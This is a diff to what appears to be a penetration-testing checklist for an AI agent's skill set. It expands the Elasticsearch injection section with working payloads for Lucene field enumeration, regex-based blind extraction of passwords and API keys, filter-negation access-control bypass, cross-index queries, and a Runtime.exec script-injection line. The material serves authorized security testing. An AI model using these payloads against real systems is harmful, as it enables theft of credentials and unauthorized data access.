@@ -228,22 +228,46 @@ CouchDB has a different attack surface than MongoDB. Test these if CouchDB is id
 
 ## Elasticsearch Testing
 
-Elasticsearch injection has narrowed significantly since ES 5.x disabled inline scripting by default.
+Elasticsearch injection targets `query_string` and `simple_query_string` query types where user input reaches Lucene syntax parsing. Script injection (`painless`, `groovy`) is disabled by default since ES 5.x and rarely viable. The real surface is data extraction and access control bypass via search syntax.
 
-- [ ] **Lucene query injection**: if user input is concatenated into query strings:
-  ```
-  search=*&_source=password,secret_key
-  search=admin" OR "1"="1
-  ```
-- [ ] **Script injection** (requires `script.inline: true` — rare in production):
+For the full methodology, load `agent/skills/elasticsearch-injection/SKILL.md`.
+
+### Quick Detection
+
+- [ ] **Confirm query_string processing**: send `search=test AND 1=1` vs `search=test AND 1=2` — if result sets differ, boolean operators are parsed
+- [ ] **Wildcard test**: `search=*` returns more results than a specific term → Lucene syntax active
+- [ ] **Field-qualified probe**: `search=_exists_:password` → if results change, field queries work
+
+### Field Enumeration (highest-value attack)
+
+- [ ] **Lucene field query**: `search=password:*`, `search=api_key:*`, `search=secret:*`
+- [ ] **Existence check**: `search=_exists_:password`, `search=_exists_:token`
+- [ ] **Wildcard field names**: `search=pass*:*`, `search=*secret*:*`
+- [ ] **Source override**: `?search=test&_source=password,api_key,secret`
+
+### Data Extraction
+
+- [ ] **Regex extraction**: `search=password:/^a.*/` → binary search on characters
+- [ ] **Range queries**: `search=salary:[50000 TO 100000]`
+- [ ] **Boolean blind via count**: `search=admin_password:/^s.*/` → count changes confirm character
+
+### Access Control Bypass
+
+- [ ] **Negate app-injected filters**: `search=*) OR deleted:true OR (*:*`
+- [ ] **Cross-index**: `?search=*&index=_all` or `?index=credentials`
+
+### Direct API Access (rare but critical)
+
+- [ ] **Index enumeration**: `GET /_cat/indices?v` — list all indices
+- [ ] **Mapping disclosure**: `GET /_mapping` — field names and types for all indices
+- [ ] **Script injection** (requires `script.inline: true` — rare):
   ```json
   {"query": {"bool": {"must": [{"script": {"script": "java.lang.Runtime.getRuntime().exec('id')"}}]}}}
   ```
-- [ ] **Field enumeration via wildcards**:
-  ```json
-  {"query": {"regexp": {"password": {"value": "a.*"}}}}
-  ```
-- [ ] **Index enumeration**: `GET /_cat/indices?v` — list all indices, look for sensitive data stores
+
+### Extended Reference
+
+Full payload library: `agent/references/payloads/elasticsearch-injection-payloads.md`
 
 ---
 
